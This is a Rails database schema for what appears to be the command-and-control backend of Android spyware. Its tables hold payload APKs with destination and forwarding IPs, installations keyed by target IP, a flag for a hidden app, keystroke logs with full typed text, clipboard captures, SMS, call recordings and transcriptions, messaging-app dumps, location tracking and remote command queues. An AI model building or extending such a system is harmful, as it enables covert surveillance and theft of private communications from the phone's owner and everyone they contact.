# This file is auto-generated from the current state of the database. Instead
# of editing this file, please use the migrations feature of Active Record to
# incrementally modify your database, and then regenerate this schema definition.
#
# This file is the source Rails uses to define your schema when running `bin/rails
# db:schema:load`. When creating a new database, `bin/rails db:schema:load` tends to
# be faster and is potentially less error prone than running all of your
# migrations from scratch. Old migrations may fail to apply correctly if those
# migrations use external dependencies or application code.
#
# It's strongly recommended that you check this file into your version control system.

ActiveRecord::Schema.define(version: 2026_02_18_100000) do

  # These are extensions that must be enabled in order to support this database
  enable_extension "pg_trgm"
  enable_extension "plpgsql"

  create_table "active_admin_comments", force: :cascade do |t|
    t.string "namespace"
    t.text "body"
    t.string "resource_type"
    t.bigint "resource_id"
    t.string "author_type"
    t.bigint "author_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["author_type", "author_id"], name: "index_active_admin_comments_on_author_type_and_author_id"
    t.index ["namespace"], name: "index_active_admin_comments_on_namespace"
    t.index ["resource_type", "resource_id"], name: "index_active_admin_comments_on_resource_type_and_resource_id"
  end

  create_table "admin_sessions", force: :cascade do |t|
    t.bigint "admin_user_id", null: false
    t.string "session_token", null: false
    t.string "ip_address"
    t.string "user_agent"
    t.datetime "last_activity_at", null: false
    t.datetime "expires_at", null: false
    t.boolean "active", default: true, null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["admin_user_id", "active"], name: "index_admin_sessions_on_admin_user_id_and_active"
    t.index ["admin_user_id"], name: "index_admin_sessions_on_admin_user_id"
    t.index ["expires_at"], name: "index_admin_sessions_on_expires_at"
    t.index ["session_token"], name: "index_admin_sessions_on_session_token", unique: true
  end

  create_table "admin_two_factors", force: :cascade do |t|
    t.bigint "admin_user_id", null: false
    t.string "otp_secret", null: false
    t.boolean "enabled", default: false, null: false
    t.json "backup_codes", default: []
    t.datetime "last_used_at"
    t.integer "failed_attempts", default: 0, null: false
    t.datetime "locked_until"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["admin_user_id"], name: "index_admin_two_factors_on_admin_user_id", unique: true
  end

  create_table "admin_users", force: :cascade do |t|
    t.string "email", default: "", null: false
    t.string "encrypted_password", default: "", null: false
    t.string "reset_password_token"
    t.datetime "reset_password_sent_at"
    t.datetime "remember_created_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["email"], name: "index_admin_users_on_email", unique: true
    t.index ["reset_password_token"], name: "index_admin_users_on_reset_password_token", unique: true
  end

  create_table "alert_rules", force: :cascade do |t|
    t.string "name", null: false
    t.string "event_type", null: false
    t.json "conditions", default: {}
    t.json "notification_channels", default: []
    t.boolean "enabled", default: true
    t.integer "cooldown_minutes", default: 60
    t.json "metadata", default: {}
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["enabled"], name: "index_alert_rules_on_enabled"
    t.index ["event_type"], name: "index_alert_rules_on_event_type"
  end

  create_table "alerts", force: :cascade do |t|
    t.bigint "alert_rule_id"
    t.bigint "device_id"
    t.string "severity"
    t.string "title", null: false
    t.text "message"
    t.json "metadata", default: {}
    t.datetime "triggered_at"
    t.datetime "acknowledged_at"
    t.bigint "acknowledged_by_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["acknowledged_by_id"], name: "index_alerts_on_acknowledged_by_id"
    t.index ["alert_rule_id"], name: "index_alerts_on_alert_rule_id"
    t.index ["device_id", "triggered_at"], name: "index_alerts_on_device_id_and_triggered_at"
    t.index ["device_id"], name: "index_alerts_on_device_id"
    t.index ["severity"], name: "index_alerts_on_severity"
  end

  create_table "api_keys", force: :cascade do |t|
    t.bigint "admin_user_id"
    t.string "device_id"
    t.string "key_digest", null: false
    t.string "key_prefix", null: false
    t.string "name", null: false
    t.string "scope", default: "read_only", null: false
    t.integer "usage_count", default: 0, null: false
    t.datetime "last_used_at"
    t.datetime "expires_at"
    t.boolean "revoked", default: false, null: false
    t.datetime "revoked_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["admin_user_id"], name: "index_api_keys_on_admin_user_id"
    t.index ["device_id", "revoked"], name: "index_api_keys_on_device_id_and_revoked"
    t.index ["key_digest"], name: "index_api_keys_on_key_digest", unique: true
    t.index ["key_prefix"], name: "index_api_keys_on_key_prefix"
    t.index ["revoked"], name: "index_api_keys_on_revoked"
  end

  create_table "apk_installations", force: :cascade do |t|
    t.string "target_ip"
    t.string "status"
    t.bigint "apk_payload_id", null: false
    t.datetime "created_at", precision: 6
    t.datetime "updated_at", precision: 6
    t.index ["apk_payload_id"], name: "index_apk_installations_on_apk_payload_id"
  end

  create_table "apk_payloads", force: :cascade do |t|
    t.string "destination_ip"
    t.string "destination_port"
    t.string "forwarding_ip"
    t.string "forwarding_port"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.string "name"
  end

  create_table "audio_transcriptions", force: :cascade do |t|
    t.bigint "recording_id", null: false
    t.text "text", null: false
    t.string "language", default: "en"
    t.float "confidence"
    t.jsonb "speakers", default: []
    t.jsonb "keywords", default: []
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["created_at"], name: "index_audio_transcriptions_on_created_at"
    t.index ["language"], name: "index_audio_transcriptions_on_language"
    t.index ["recording_id"], name: "index_audio_transcriptions_on_recording_id"
  end

  create_table "audit_logs", force: :cascade do |t|
    t.bigint "admin_user_id"
    t.string "action", null: false
    t.string "auditable_type"
    t.bigint "auditable_id"
    t.json "changes", default: {}
    t.json "metadata", default: {}
    t.string "ip_address"
    t.string "user_agent"
    t.text "request_params"
    t.string "request_method"
    t.string "request_path"
    t.integer "response_status"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["action"], name: "index_audit_logs_on_action"
    t.index ["admin_user_id", "created_at"], name: "index_audit_logs_on_admin_user_id_and_created_at"
    t.index ["admin_user_id"], name: "index_audit_logs_on_admin_user_id"
    t.index ["auditable_type", "auditable_id"], name: "index_audit_logs_on_auditable_type_and_auditable_id"
    t.index ["created_at"], name: "index_audit_logs_on_created_at"
  end

  create_table "bookmarks", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "title"
    t.string "url", null: false
    t.string "browser"
    t.string "folder"
    t.datetime "bookmarked_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["browser"], name: "index_bookmarks_on_browser"
    t.index ["smartphone_id", "url"], name: "index_bookmarks_on_smartphone_id_and_url"
    t.index ["smartphone_id"], name: "index_bookmarks_on_smartphone_id"
  end

  create_table "call_logs", force: :cascade do |t|
    t.date "date"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["date"], name: "idx_calls_date"
    t.index ["smartphone_id", "created_at"], name: "idx_calls_device_time", order: { created_at: :desc }
    t.index ["smartphone_id"], name: "index_call_logs_on_smartphone_id"
  end

  create_table "certificates", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "subject", null: false
    t.string "issuer"
    t.string "serial_number"
    t.string "fingerprint_sha256"
    t.datetime "valid_from"
    t.datetime "valid_to"
    t.boolean "is_system", default: false, null: false
    t.boolean "is_trusted", default: true, null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["is_system"], name: "index_certificates_on_is_system"
    t.index ["smartphone_id", "fingerprint_sha256"], name: "index_certificates_on_smartphone_id_and_fingerprint_sha256"
    t.index ["smartphone_id"], name: "index_certificates_on_smartphone_id"
  end

  create_table "clipboard_entries", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.text "content", null: false
    t.string "source_app"
    t.datetime "captured_at", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id", "captured_at"], name: "index_clipboard_entries_on_smartphone_id_and_captured_at"
    t.index ["smartphone_id"], name: "index_clipboard_entries_on_smartphone_id"
    t.index ["source_app"], name: "index_clipboard_entries_on_source_app"
  end

  create_table "contacts", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "filename"
    t.string "date"
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["smartphone_id", "created_at"], name: "idx_contacts_device_time"
    t.index ["smartphone_id"], name: "index_contacts_on_smartphone_id"
  end

  create_table "data_usage_disclosures", force: :cascade do |t|
    t.bigint "device_id", null: false
    t.string "disclosure_type"
    t.text "disclosure_content"
    t.datetime "disclosed_at"
    t.boolean "acknowledged", default: false
    t.datetime "acknowledged_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_id"], name: "index_data_usage_disclosures_on_device_id"
    t.index ["disclosure_type"], name: "index_data_usage_disclosures_on_disclosure_type"
  end

  create_table "device_consents", force: :cascade do |t|
    t.bigint "device_id", null: false
    t.string "consent_type", null: false
    t.boolean "granted", default: false, null: false
    t.datetime "granted_at"
    t.datetime "revoked_at"
    t.string "granted_by"
    t.string "ip_address"
    t.text "consent_text"
    t.string "consent_version"
    t.json "metadata", default: {}
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["consent_type"], name: "index_device_consents_on_consent_type"
    t.index ["device_id", "consent_type"], name: "index_device_consents_on_device_id_and_consent_type", unique: true
    t.index ["device_id"], name: "index_device_consents_on_device_id"
    t.index ["granted"], name: "index_device_consents_on_granted"
  end

  create_table "device_group_memberships", force: :cascade do |t|
    t.bigint "device_id", null: false
    t.bigint "device_group_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_group_id"], name: "index_device_group_memberships_on_device_group_id"
    t.index ["device_id", "device_group_id"], name: "idx_device_group_unique", unique: true
    t.index ["device_id"], name: "index_device_group_memberships_on_device_id"
  end

  create_table "device_groups", force: :cascade do |t|
    t.string "name", null: false
    t.string "description"
    t.string "color"
    t.json "metadata", default: {}
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["name"], name: "index_device_groups_on_name", unique: true
  end

  create_table "device_notifications", force: :cascade do |t|
    t.string "device_id", null: false
    t.string "package_name", null: false
    t.string "app_name"
    t.string "title"
    t.text "content"
    t.string "sub_text"
    t.string "category"
    t.integer "notification_id"
    t.string "group_key"
    t.boolean "is_ongoing", default: false
    t.boolean "is_clearable", default: true
    t.bigint "post_time"
    t.datetime "received_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_id", "post_time"], name: "index_device_notifications_on_device_id_and_post_time"
    t.index ["device_id", "received_at"], name: "idx_notifications_device_received", order: { received_at: :desc }
    t.index ["device_id"], name: "index_device_notifications_on_device_id"
    t.index ["package_name"], name: "index_device_notifications_on_package_name"
    t.index ["post_time"], name: "index_device_notifications_on_post_time"
  end

  create_table "device_settings", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "key", null: false
    t.string "value", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id", "key"], name: "index_device_settings_on_smartphone_id_and_key", unique: true
    t.index ["smartphone_id"], name: "index_device_settings_on_smartphone_id"
  end

  create_table "device_tags", force: :cascade do |t|
    t.bigint "device_id", null: false
    t.string "key", null: false
    t.string "value"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_id", "key"], name: "index_device_tags_on_device_id_and_key", unique: true
    t.index ["device_id"], name: "index_device_tags_on_device_id"
  end

  create_table "geo_locations", force: :cascade do |t|
    t.date "date"
    t.string "lat"
    t.string "long"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["smartphone_id", "created_at"], name: "idx_locations_device_time", order: { created_at: :desc }
    t.index ["smartphone_id", "date"], name: "idx_locations_device_date"
    t.index ["smartphone_id"], name: "index_geo_locations_on_smartphone_id"
  end

  create_table "geofence_events", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.bigint "geofence_id", null: false
    t.string "event_type", null: false
    t.float "lat", null: false
    t.float "lng", null: false
    t.datetime "triggered_at", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["event_type"], name: "index_geofence_events_on_event_type"
    t.index ["geofence_id"], name: "index_geofence_events_on_geofence_id"
    t.index ["smartphone_id", "triggered_at"], name: "index_geofence_events_on_smartphone_id_and_triggered_at"
    t.index ["smartphone_id"], name: "index_geofence_events_on_smartphone_id"
    t.index ["triggered_at"], name: "index_geofence_events_on_triggered_at"
  end

  create_table "geofences", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "name", null: false
    t.float "lat"
    t.float "lng"
    t.float "radius_meters"
    t.json "polygon_points"
    t.boolean "active", default: true, null: false
    t.boolean "alert_on_entry", default: true, null: false
    t.boolean "alert_on_exit", default: false, null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["active"], name: "index_geofences_on_active"
    t.index ["smartphone_id", "active"], name: "index_geofences_on_smartphone_id_and_active"
    t.index ["smartphone_id"], name: "index_geofences_on_smartphone_id"
  end

  create_table "installed_apps", force: :cascade do |t|
    t.bigint "device_id", null: false
    t.string "package_name", null: false
    t.string "app_name"
    t.string "version_name"
    t.bigint "version_code"
    t.boolean "is_system_app", default: false
    t.datetime "install_time"
    t.datetime "last_update_time"
    t.json "permissions", default: []
    t.json "metadata", default: {}
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_id", "package_name"], name: "index_installed_apps_on_device_id_and_package_name", unique: true
    t.index ["device_id"], name: "index_installed_apps_on_device_id"
  end

  create_table "keylog_screenshots", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "device_id"
    t.bigint "client_timestamp"
    t.string "app_package"
    t.string "app_name"
    t.string "trigger_type"
    t.string "image_path"
    t.integer "width"
    t.integer "height"
    t.integer "file_size"
    t.string "session_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["client_timestamp"], name: "index_keylog_screenshots_on_client_timestamp"
    t.index ["device_id"], name: "index_keylog_screenshots_on_device_id"
    t.index ["smartphone_id", "client_timestamp"], name: "idx_keylog_screenshots_device_time", order: { client_timestamp: :desc }
    t.index ["smartphone_id"], name: "index_keylog_screenshots_on_smartphone_id"
    t.index ["trigger_type"], name: "index_keylog_screenshots_on_trigger_type"
  end

  create_table "keylogs", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "device_id"
    t.bigint "client_timestamp"
    t.string "app_package"
    t.string "app_name"
    t.string "activity"
    t.string "keystroke"
    t.text "full_text"
    t.string "input_type"
    t.string "field_id"
    t.string "event_type"
    t.string "session_id"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.datetime "captured_at"
    t.index ["app_name"], name: "idx_keylogs_app_name"
    t.index ["app_name"], name: "index_keylogs_on_app_name_trgm", opclass: :gin_trgm_ops, using: :gin
    t.index ["app_package"], name: "index_keylogs_on_app_package"
    t.index ["client_timestamp"], name: "index_keylogs_on_client_timestamp"
    t.index ["created_at"], name: "idx_keylogs_recent", order: :desc
    t.index ["device_id"], name: "index_keylogs_on_device_id"
    t.index ["event_type"], name: "index_keylogs_on_event_type"
    t.index ["full_text"], name: "index_keylogs_on_full_text_trgm", opclass: :gin_trgm_ops, using: :gin
    t.index ["keystroke"], name: "idx_keylogs_keystroke_trgm", opclass: :gin_trgm_ops, using: :gin
    t.index ["keystroke"], name: "index_keylogs_on_keystroke_trgm", opclass: :gin_trgm_ops, using: :gin
    t.index ["smartphone_id", "app_package", "created_at"], name: "idx_keylogs_device_app_time", order: { created_at: :desc }
    t.index ["smartphone_id", "created_at"], name: "idx_keylogs_active_devices", order: { created_at: :desc }
    t.index ["smartphone_id", "created_at"], name: "idx_keylogs_device_time", order: { created_at: :desc }
    t.index ["smartphone_id"], name: "index_keylogs_on_smartphone_id"
  end

  create_table "messaging_apps_dumps", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.string "app_name"
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["smartphone_id", "app_name", "created_at"], name: "idx_messaging_dumps_device_app_time"
    t.index ["smartphone_id"], name: "index_messaging_apps_dumps_on_smartphone_id"
  end

  create_table "notification_channels", force: :cascade do |t|
    t.string "channel_type", null: false
    t.string "name", null: false
    t.json "config", default: {}
    t.boolean "enabled", default: true
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
  end

  create_table "notification_logs", force: :cascade do |t|
    t.bigint "alert_id"
    t.bigint "notification_channel_id"
    t.string "status"
    t.text "error_message"
    t.json "response_data", default: {}
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["alert_id", "status"], name: "index_notification_logs_on_alert_id_and_status"
    t.index ["alert_id"], name: "index_notification_logs_on_alert_id"
    t.index ["notification_channel_id"], name: "index_notification_logs_on_notification_channel_id"
  end

  create_table "notification_media", force: :cascade do |t|
    t.bigint "device_notification_id", null: false
    t.string "media_type", null: false
    t.binary "data"
    t.string "mime_type"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["device_notification_id"], name: "index_notification_media_on_device_notification_id"
    t.index ["media_type"], name: "index_notification_media_on_media_type"
  end

  create_table "pending_commands", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "request_id", null: false
    t.string "command", null: false
    t.json "params"
    t.integer "status", default: 0, null: false
    t.json "response_data"
    t.datetime "completed_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["created_at"], name: "index_pending_commands_on_created_at"
    t.index ["request_id"], name: "index_pending_commands_on_request_id", unique: true
    t.index ["smartphone_id", "created_at"], name: "idx_commands_pending_only", order: { created_at: :desc }, where: "(status = 0)"
    t.index ["smartphone_id", "status", "created_at"], name: "idx_commands_queue"
    t.index ["smartphone_id", "status"], name: "index_pending_commands_on_smartphone_and_status"
    t.index ["smartphone_id"], name: "index_pending_commands_on_smartphone_id"
    t.index ["status", "created_at", "smartphone_id"], name: "idx_commands_active"
    t.index ["status"], name: "index_pending_commands_on_status"
  end

  create_table "pictures", force: :cascade do |t|
    t.date "date"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["smartphone_id", "created_at"], name: "idx_pictures_device_time", order: { created_at: :desc }
    t.index ["smartphone_id", "date"], name: "idx_pictures_device_date"
    t.index ["smartphone_id"], name: "index_pictures_on_smartphone_id"
  end

  create_table "queued_commands", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "command", null: false
    t.jsonb "params", default: {}
    t.integer "priority", default: 5, null: false
    t.datetime "expires_at", null: false
    t.string "status", default: "pending", null: false
    t.datetime "sent_at"
    t.string "error_message"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["smartphone_id", "priority", "created_at"], name: "index_queued_commands_on_device_priority_order"
    t.index ["smartphone_id", "status"], name: "index_queued_commands_on_smartphone_id_and_status"
    t.index ["smartphone_id"], name: "index_queued_commands_on_smartphone_id"
    t.index ["status", "expires_at"], name: "index_queued_commands_on_status_and_expires_at"
  end

  create_table "recordings", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.string "recording_type", default: "audio"
    t.string "call_number"
    t.string "call_direction"
    t.string "strategy"
    t.index ["recording_type"], name: "index_recordings_on_recording_type"
    t.index ["smartphone_id", "date"], name: "idx_recordings_device_date"
    t.index ["smartphone_id", "recording_type", "created_at"], name: "idx_recordings_device_type_time", order: { created_at: :desc }
    t.index ["smartphone_id"], name: "index_recordings_on_smartphone_id"
  end

  create_table "remembered_devices", force: :cascade do |t|
    t.bigint "admin_user_id", null: false
    t.string "device_fingerprint", null: false
    t.string "user_agent"
    t.string "ip_address"
    t.datetime "expires_at", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["admin_user_id", "device_fingerprint"], name: "idx_remembered_devices_lookup"
    t.index ["admin_user_id"], name: "index_remembered_devices_on_admin_user_id"
    t.index ["expires_at"], name: "index_remembered_devices_on_expires_at"
  end

  create_table "scheduled_command_executions", force: :cascade do |t|
    t.bigint "scheduled_command_id", null: false
    t.bigint "pending_command_id"
    t.string "status", null: false
    t.jsonb "result"
    t.datetime "executed_at", null: false
    t.integer "duration_ms"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["executed_at"], name: "index_scheduled_command_executions_on_executed_at"
    t.index ["pending_command_id"], name: "index_scheduled_command_executions_on_pending_command_id"
    t.index ["scheduled_command_id"], name: "index_scheduled_command_executions_on_scheduled_command_id"
    t.index ["status"], name: "index_scheduled_command_executions_on_status"
  end

  create_table "scheduled_commands", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "command", null: false
    t.jsonb "params", default: {}
    t.integer "schedule_type", default: 0, null: false
    t.string "cron_expression"
    t.datetime "next_run_at"
    t.datetime "last_run_at"
    t.boolean "active", default: true, null: false
    t.integer "run_count", default: 0, null: false
    t.integer "max_runs"
    t.string "name"
    t.text "description"
    t.jsonb "last_result"
    t.string "last_status"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["active", "next_run_at"], name: "index_scheduled_commands_due"
    t.index ["active"], name: "index_scheduled_commands_on_active"
    t.index ["next_run_at"], name: "index_scheduled_commands_on_next_run_at"
    t.index ["schedule_type"], name: "index_scheduled_commands_on_schedule_type"
    t.index ["smartphone_id"], name: "index_scheduled_commands_on_smartphone_id"
  end

  create_table "screenshots", force: :cascade do |t|
    t.date "date"
    t.string "duration"
    t.string "filename"
    t.bigint "smartphone_id", null: false
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["smartphone_id", "created_at"], name: "idx_screenshots_device_time", order: { created_at: :desc }
    t.index ["smartphone_id"], name: "index_screenshots_on_smartphone_id"
  end

  create_table "security_events", force: :cascade do |t|
    t.string "device_id", null: false
    t.string "event_type", null: false
    t.string "severity", default: "info", null: false
    t.text "details"
    t.datetime "detected_at", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["detected_at"], name: "index_security_events_on_detected_at"
    t.index ["device_id", "event_type"], name: "index_security_events_on_device_and_type"
    t.index ["device_id"], name: "index_security_events_on_device_id"
    t.index ["event_type"], name: "index_security_events_on_event_type"
    t.index ["severity", "detected_at"], name: "index_security_events_on_severity_and_time"
    t.index ["severity"], name: "index_security_events_on_severity"
  end

  create_table "smartphones", force: :cascade do |t|
    t.string "operating_system"
    t.string "name"
    t.string "is_rooted"
    t.string "is_app_hidden"
    t.bigint "apk_installation_id", null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.string "device_id"
    t.integer "keylogs_count", default: 0, null: false
    t.integer "commands_count", default: 0, null: false
    t.index ["apk_installation_id"], name: "index_smartphones_on_apk_installation_id"
    t.index ["commands_count"], name: "idx_smartphones_commands_count"
    t.index ["device_id"], name: "idx_smartphones_device_id", unique: true
    t.index ["keylogs_count"], name: "idx_smartphones_keylogs_count"
  end

  create_table "sms_messages", force: :cascade do |t|
    t.date "date"
    t.bigint "smartphone_id", null: false
    t.string "filename"
    t.datetime "created_at", default: -> { "now()" }
    t.datetime "updated_at", default: -> { "now()" }
    t.index ["date"], name: "idx_sms_date"
    t.index ["smartphone_id", "created_at"], name: "idx_sms_device_time", order: { created_at: :desc }
    t.index ["smartphone_id"], name: "index_sms_messages_on_smartphone_id"
  end

  create_table "stored_files", force: :cascade do |t|
    t.string "path", null: false
    t.string "original_filename", null: false
    t.bigint "size", default: 0, null: false
    t.string "content_type"
    t.string "checksum", null: false
    t.string "storage_backend", default: "local", null: false
    t.string "storage_key", null: false
    t.integer "reference_count", default: 1, null: false
    t.json "metadata", default: {}
    t.datetime "last_accessed_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["checksum"], name: "index_stored_files_on_checksum"
    t.index ["created_at"], name: "index_stored_files_on_created_at"
    t.index ["storage_backend"], name: "index_stored_files_on_storage_backend"
    t.index ["storage_key"], name: "index_stored_files_on_storage_key", unique: true
  end

  create_table "terms_acceptances", force: :cascade do |t|
    t.bigint "device_id", null: false
    t.string "terms_version", null: false
    t.text "terms_text"
    t.boolean "accepted", default: false
    t.datetime "accepted_at"
    t.string "ip_address"
    t.string "user_agent"
    t.json "acceptance_metadata", default: {}
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["accepted"], name: "index_terms_acceptances_on_accepted"
    t.index ["device_id", "terms_version"], name: "index_terms_acceptances_on_device_id_and_terms_version"
    t.index ["device_id"], name: "index_terms_acceptances_on_device_id"
  end

  create_table "tracked_errors", force: :cascade do |t|
    t.string "fingerprint", null: false
    t.string "error_class", null: false
    t.text "message", null: false
    t.json "backtrace", default: []
    t.integer "count", default: 0, null: false
    t.datetime "first_seen_at", null: false
    t.datetime "last_seen_at", null: false
    t.string "status", default: "open", null: false
    t.json "device_ids", default: []
    t.datetime "resolved_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["count"], name: "index_tracked_errors_on_count"
    t.index ["fingerprint"], name: "index_tracked_errors_on_fingerprint", unique: true
    t.index ["last_seen_at"], name: "index_tracked_errors_on_last_seen_at"
    t.index ["status", "last_seen_at"], name: "index_tracked_errors_on_status_and_last_seen"
    t.index ["status"], name: "index_tracked_errors_on_status"
  end

  create_table "upload_chunks", force: :cascade do |t|
    t.string "upload_id", null: false
    t.integer "chunk_number", null: false
    t.integer "total_chunks", null: false
    t.string "checksum"
    t.string "filename"
    t.string "status", default: "pending", null: false
    t.datetime "uploaded_at"
    t.index ["status"], name: "index_upload_chunks_on_status"
    t.index ["upload_id", "chunk_number"], name: "index_upload_chunks_on_upload_id_and_chunk_number", unique: true
    t.index ["upload_id"], name: "index_upload_chunks_on_upload_id"
    t.index ["uploaded_at"], name: "index_upload_chunks_on_uploaded_at"
  end

  create_table "user_preferences", force: :cascade do |t|
    t.bigint "admin_user_id", null: false
    t.jsonb "preferences", default: {}, null: false
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["admin_user_id"], name: "index_user_preferences_on_admin_user_id", unique: true
  end

  create_table "wifi_networks", force: :cascade do |t|
    t.bigint "smartphone_id", null: false
    t.string "ssid", null: false
    t.string "bssid"
    t.string "security_type"
    t.integer "signal_strength"
    t.boolean "is_connected", default: false, null: false
    t.boolean "is_saved", default: false, null: false
    t.datetime "first_seen_at"
    t.datetime "last_connected_at"
    t.datetime "created_at", precision: 6, null: false
    t.datetime "updated_at", precision: 6, null: false
    t.index ["is_connected"], name: "index_wifi_networks_on_is_connected"
    t.index ["smartphone_id", "ssid"], name: "index_wifi_networks_on_smartphone_id_and_ssid"
    t.index ["smartphone_id"], name: "index_wifi_networks_on_smartphone_id"
  end

  add_foreign_key "admin_sessions", "admin_users"
  add_foreign_key "admin_two_factors", "admin_users"
  add_foreign_key "alerts", "admin_users", column: "acknowledged_by_id"
  add_foreign_key "alerts", "alert_rules"
  add_foreign_key "alerts", "apk_installations", column: "device_id"
  add_foreign_key "api_keys", "admin_users"
  add_foreign_key "apk_installations", "apk_payloads"
  add_foreign_key "audio_transcriptions", "recordings"
  add_foreign_key "audit_logs", "admin_users"
  add_foreign_key "bookmarks", "smartphones"
  add_foreign_key "call_logs", "smartphones", on_delete: :cascade
  add_foreign_key "certificates", "smartphones"
  add_foreign_key "clipboard_entries", "smartphones"
  add_foreign_key "contacts", "smartphones", on_delete: :cascade
  add_foreign_key "data_usage_disclosures", "apk_installations", column: "device_id"
  add_foreign_key "device_consents", "apk_installations", column: "device_id"
  add_foreign_key "device_group_memberships", "apk_installations", column: "device_id"
  add_foreign_key "device_group_memberships", "device_groups"
  add_foreign_key "device_settings", "smartphones"
  add_foreign_key "device_tags", "apk_installations", column: "device_id"
  add_foreign_key "geo_locations", "smartphones", on_delete: :cascade
  add_foreign_key "geofence_events", "geofences"
  add_foreign_key "geofence_events", "smartphones"
  add_foreign_key "geofences", "smartphones"
  add_foreign_key "installed_apps", "apk_installations", column: "device_id"
  add_foreign_key "keylog_screenshots", "smartphones"
  add_foreign_key "keylogs", "smartphones"
  add_foreign_key "messaging_apps_dumps", "smartphones", on_delete: :cascade
  add_foreign_key "notification_logs", "alerts"
  add_foreign_key "notification_logs", "notification_channels"
  add_foreign_key "notification_media", "device_notifications"
  add_foreign_key "pending_commands", "smartphones"
  add_foreign_key "pictures", "smartphones", on_delete: :cascade
  add_foreign_key "queued_commands", "smartphones"
  add_foreign_key "recordings", "smartphones", on_delete: :cascade
